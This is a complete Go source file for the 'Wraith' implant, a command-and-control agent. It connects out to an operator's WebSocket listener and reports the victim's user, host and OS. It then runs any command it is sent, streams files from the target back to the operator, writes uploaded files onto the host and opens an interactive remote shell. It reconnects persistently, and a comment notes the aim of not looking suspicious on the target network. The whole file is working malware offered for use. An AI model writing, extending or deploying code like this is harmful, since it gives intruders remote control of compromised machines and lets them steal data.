// Wraith implant — Go backend.
// Connects to a Wraith listener over WebSocket, speaks the JSON protocol
// (see wraith/protocol.py). Executes task argv verbatim, streams file
// transfers in chunks, hosts a fully interactive pty terminal, reconnects
// with capped exponential backoff.
//
// Manual build:  go build -ldflags "-s -w" -o wraith-go .
//                (embedded config comes from config_embedded.go when built via `wraith ❯ build`)
// Run:           ./wraith-go [-url ws://…] [-token …] [-v]

package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/creack/pty"
	"github.com/gorilla/websocket"
)

const (
	execTimeout     = 120 * time.Second
	maxReadBytes    = 1024 * 1024
	dialTimeout     = 15 * time.Second
	writeTimeout    = 10 * time.Second
	backoffStart    = 1 * time.Second
	backoffMax      = 60 * time.Second
	maxOutputBytes  = 512 * 1024
	fileCap         = 10 * 1024 * 1024
	ptyChunk        = 4096
	maxArgvItems    = 128
	maxArgvItemSize = 4096
)

type message struct {
	Type     string   `json:"type"`
	TaskID   string   `json:"task_id,omitempty"`
	Action   string   `json:"action,omitempty"`
	Argv     []string `json:"argv,omitempty"`
	OK       bool     `json:"ok"`
	Out      string   `json:"out,omitempty"`
	Part     int      `json:"part,omitempty"`
	Parts    int      `json:"parts,omitempty"`
	Data     string   `json:"data,omitempty"`
	Done     bool     `json:"done"`
	Implant  string   `json:"implant,omitempty"`
	Os       string   `json:"os,omitempty"`
	Arch     string   `json:"arch,omitempty"`
	User     string   `json:"user,omitempty"`
	Host     string   `json:"host,omitempty"`
	Session  string   `json:"session,omitempty"`
	Interval int      `json:"interval,omitempty"`
	Tags     []string `json:"tags,omitempty"`
}

// protocolTag — the wire dialect this implant speaks. The listener must agree
// on at least one common tag (see wraith/protocol.py) or the connection is
// refused on both sides.
var protocolTags = []string{"ws-json-async"}

// sentinel for an incompatible listener — fatal deliberately: silently retrying
// a listener that speaks another dialect would loop forever and look suspicious
// on the target network.
var errProtocolMismatch = errors.New("listener protocol mismatch")

type ptySession struct {
	master *os.File
	cmd    *exec.Cmd
	dead   atomic.Bool
}

var (
	verbose   = flag.Bool("v", false, "log protocol events to stderr")
	flagURL   = flag.String("url", embedURL, "listener WebSocket URL (default: embedded)")
	flagToken = flag.String("token", embedToken, "shared token (default: embedded)")
)

func log(format string, args ...interface{}) {
	if *verbose {
		fmt.Fprintf(os.Stderr, "[wraith] "+format+"\n", args...)
	}
}

func identify() (string, string) {
	userName := "unknown"
	if u, err := user.Current(); err == nil && u.Username != "" {
		userName = u.Username
	} else if env := os.Getenv("USER"); env != "" {
		userName = env
	} else if env := os.Getenv("USERNAME"); env != "" {
		userName = env
	}
	host, err := os.Hostname()
	if err != nil || host == "" {
		host = "unknown"
	}
	return userName, host
}

func clamp(s string) string {
	if len(s) > maxOutputBytes {
		return s[:maxOutputBytes] + "\n… [output truncated]"
	}
	return s
}

func clampArgv(argv []string) []string {
	if len(argv) > maxArgvItems {
		argv = argv[:maxArgvItems]
	}
	for i, a := range argv {
		if len(a) > maxArgvItemSize {
			argv[i] = a[:maxArgvItemSize]
		}
	}
	return argv
}

var writeMu sync.Mutex

func writeMessage(conn *websocket.Conn, msg message) error {
	writeMu.Lock()
	defer writeMu.Unlock()
	conn.SetWriteDeadline(time.Now().Add(writeTimeout))
	return conn.WriteJSON(msg)
}

func decodeData(encoded string) []byte {
	if encoded == "" {
		return nil
	}
	raw, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil
	}
	return raw
}

func runShell(conn *websocket.Conn, msg message) {
	argv := clampArgv(msg.Argv)
	if len(argv) == 0 {
		writeMessage(conn, message{Type: "result", TaskID: msg.TaskID, OK: false, Out: "empty argv"})
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), execTimeout)
	defer cancel()
	cmd := exec.CommandContext(ctx, argv[0], argv[1:]...)
	out, err := cmd.CombinedOutput()
	ok := err == nil
	if err != nil && len(out) == 0 {
		out = []byte(err.Error())
	}
	writeMessage(conn, message{Type: "result", TaskID: msg.TaskID, OK: ok, Out: clamp(string(out))})
}

// read_file — stream a target file to the operator in base64 chunks.
func readFile(conn *websocket.Conn, msg message) {
	argv := clampArgv(msg.Argv)
	send := func(ok bool, part, parts int, data []byte, done bool) {
		writeMessage(conn, message{
			Type: "result", TaskID: msg.TaskID, OK: ok,
			Part: part, Parts: parts, Done: done,
			Data: base64.StdEncoding.EncodeToString(data),
		})
	}
	if len(argv) == 0 || argv[0] == "" {
		send(false, 0, 1, []byte("path required"), true)
		return
	}
	f, err := os.Open(argv[0])
	if err != nil {
		send(false, 0, 1, []byte(err.Error()), true)
		return
	}
	defer f.Close()
	info, err := f.Stat()
	if err != nil {
		send(false, 0, 1, []byte(err.Error()), true)
		return
	}
	if info.Size() > fileCap {
		send(false, 0, 1, []byte("file exceeds the transfer cap"), true)
		return
	}
	body, err := io.ReadAll(f)
	if err != nil {
		send(false, 0, 1, []byte(err.Error()), true)
		return
	}
	if len(body) == 0 {
		send(true, 0, 1, []byte{}, true)
		return
	}
	breakpts := 256 * 1024
	parts := (len(body) + breakpts - 1) / breakpts
	part := 0
	for i := 0; i < len(body); i += breakpts {
		end := i + breakpts
		if end > len(body) {
			end = len(body)
		}
		send(true, part, parts, body[i:end], end == len(body))
		part++
	}
}

// write_file — assemble an operator upload from ordered chunk tasks.
func writeFile(conn *websocket.Conn, msg message) {
	argv := clampArgv(msg.Argv)
	if len(argv) == 0 || argv[0] == "" {
		writeMessage(conn, message{Type: "result", TaskID: msg.TaskID, OK: false, Out: "destination required"})
		return
	}
	dest := argv[0]
	tmp := dest + "~.wr"
	data := decodeData(msg.Data)
	if data == nil && msg.Part != 0 {
		writeMessage(conn, message{Type: "result", TaskID: msg.TaskID, OK: false, Out: "bad chunk encoding"})
		return
	}
	if msg.Part == 0 {
		if err := os.WriteFile(tmp, data, 0644); err != nil {
			writeMessage(conn, message{Type: "result", TaskID: msg.TaskID, OK: false, Out: err.Error()})
			return
		}
	} else {
		f, err := os.OpenFile(tmp, os.O_APPEND|os.O_WRONLY, 0644)
		if err != nil {
			writeMessage(conn, message{Type: "result", TaskID: msg.TaskID, OK: false, Out: err.Error()})
			return
		}
		if _, err := f.Write(data); err != nil {
			f.Close()
			writeMessage(conn, message{Type: "result", TaskID: msg.TaskID, OK: false, Out: err.Error()})
			return
		}
		f.Close()
	}
	if msg.Part == msg.Parts-1 || msg.Parts == 0 {
		if err := os.Rename(tmp, dest); err != nil {
			os.Remove(tmp)
			writeMessage(conn, message{Type: "result", TaskID: msg.TaskID, OK: false, Out: err.Error()})
			return
		}
	}
	writeMessage(conn, message{Type: "result", TaskID: msg.TaskID, OK: true, Out: fmt.Sprintf("chunk %d/%d", msg.Part+1, msg.Parts)})
}

func hasTag(list, wanted []string) bool {
	for _, have := range wanted {
		for _, t := range list {
			if strings.EqualFold(t, have) {
				return true
			}
		}
	}
	return false
}

// pty handling — fully interactive terminal on the target.
func startPTY(conn *websocket.Conn, msg message) *ptySession {
	shell := "/bin/sh"
	argv := clampArgv(msg.Argv)
	if len(argv) > 0 && argv[0] != "system" {
		shell = argv[0]
	} else if env := os.Getenv("SHELL"); env != "" {
		shell = env
	}
	cmd := exec.Command(shell)
	env := os.Environ()
	if os.Getenv("TERM") == "" {
		env = append(env, "TERM=xterm-256color", "COLORTERM=truecolor")
	}
	cmd.Env = env
	master, err := pty.Start(cmd)
	if err != nil {
		writeMessage(conn, message{Type: "result", TaskID: msg.TaskID, OK: false, Out: "pty spawn failed: " + err.Error()})
		return nil
	}
	writeMessage(conn, message{Type: "result", TaskID: msg.TaskID, OK: true, Out: "pty ready"})
	ps := &ptySession{master: master, cmd: cmd}
	go func() {
		buf := make([]byte, ptyChunk)
		for {
			n, err := master.Read(buf)
			if n > 0 {
				if werr := writeMessage(conn, message{
					Type: "pty_out",
					Data: base64.StdEncoding.EncodeToString(buf[:n]),
				}); werr != nil {
					break
				}
			}
			if err != nil {
				ps.dead.Store(true)
				_ = writeMessage(conn, message{
					Type: "pty_out",
					Data: base64.StdEncoding.EncodeToString([]byte("\r\n\x1b[2m[pty exited]\x1b[0m\r\n")),
				})
				break
			}
		}
	}()
	return ps
}

func (ps *ptySession) stop() {
	if ps == nil {
		return
	}
	ps.master.Close()
	if ps.cmd.Process != nil {
		ps.cmd.Process.Kill()
	}
	ps.cmd.Wait()
}

// serve handles the messaging loop on an established connection.
// Returns nil on a graceful die, an error on a lost connection.
func serve(conn *websocket.Conn) error {
	conn.SetReadLimit(maxReadBytes)
	userName, hostName := identify()
	register := message{
		Type: "register", Implant: "go", Os: runtime.GOOS, Arch: runtime.GOARCH,
		User: userName, Host: hostName, Tags: protocolTags,
	}
	if err := writeMessage(conn, register); err != nil {
		return err
	}
	log("registered as %s@%s (%s/%s)", userName, hostName, runtime.GOOS, runtime.GOARCH)

	var active *ptySession

	for {
		_, raw, err := conn.ReadMessage()
		if err != nil {
			if active != nil {
				active.stop()
			}
			return err
		}
		var msg message
		if err := json.Unmarshal(raw, &msg); err != nil {
			continue
		}
		switch msg.Type {
		case "welcome":
			log("session %s (interval %ds)", msg.Session, msg.Interval)
			if len(msg.Tags) > 0 && !hasTag(msg.Tags, protocolTags) {
				log("listener speaks %v — no protocol tag in common, closing", msg.Tags)
				return errProtocolMismatch
			}
		case "task":
			if active != nil && !active.dead.Load() &&
				msg.Action != "pty_in" && msg.Action != "pty_end" && msg.Action != "die" {
				writeMessage(conn, message{Type: "result", TaskID: msg.TaskID, OK: false,
					Out: "an interactive terminal is open — detach first (Ctrl-])"})
				continue
			}
			switch msg.Action {
			case "shell":
				runShell(conn, msg)
			case "ping":
				writeMessage(conn, message{Type: "result", TaskID: msg.TaskID, OK: true, Out: "pong"})
			case "read_file":
				readFile(conn, msg)
			case "write_file":
				writeFile(conn, msg)
			case "pty_open":
				if active != nil {
					active.stop()
					active = nil
				}
				active = startPTY(conn, msg)
			case "pty_in":
				if active != nil {
					if data := decodeData(msg.Data); data != nil {
						active.master.Write(data)
					}
				}
			case "pty_end":
				if active != nil {
					active.stop()
					active = nil
					log("pty closed - shell terminated")
				}
			case "die":
				log("die received — exiting")
				return nil
			default:
				writeMessage(conn, message{Type: "result", TaskID: msg.TaskID, OK: false,
					Out: "unsupported action: " + msg.Action})
			}
		case "pty_in":
			if active != nil {
				if data := decodeData(msg.Data); data != nil {
					active.master.Write(data)
				}
			}
		case "pty_end":
			if active != nil {
				active.stop()
				active = nil
				log("pty closed - shell terminated")
			}
		case "die":
			return nil
		}
	}
}

func buildURL(serverURL, token string) string {
	if token == "" {
		return serverURL
	}
	sep := "?"
	if strings.Contains(serverURL, "?") {
		sep = "&"
	}
	return serverURL + sep + "token=" + url.QueryEscape(token)
}

func main() {
	flag.Parse()

	backoff := backoffStart
	for {
		target := buildURL(*flagURL, *flagToken)
		log("connecting to %s", *flagURL)
		dialer := websocket.Dialer{HandshakeTimeout: dialTimeout}
		conn, _, err := dialer.Dial(target, nil)
		if err != nil {
			log("dial failed: %v", err)
			time.Sleep(backoff)
			if backoff*2 < backoffMax {
				backoff *= 2
			} else {
				backoff = backoffMax
			}
			continue
		}
		backoff = backoffStart
		err = serve(conn)
		conn.Close()
		if err == errProtocolMismatch {
			log("listener protocol mismatch — aborting (no retry)")
			os.Exit(1)
		}
		if err == nil {
			log("clean exit")
			return
		}
		log("connection lost: %v — reconnecting in %s", err, backoff)
		time.Sleep(backoff)
		if backoff*2 < backoffMax {
			backoff *= 2
		} else {
			backoff = backoffMax
		}
	}
}
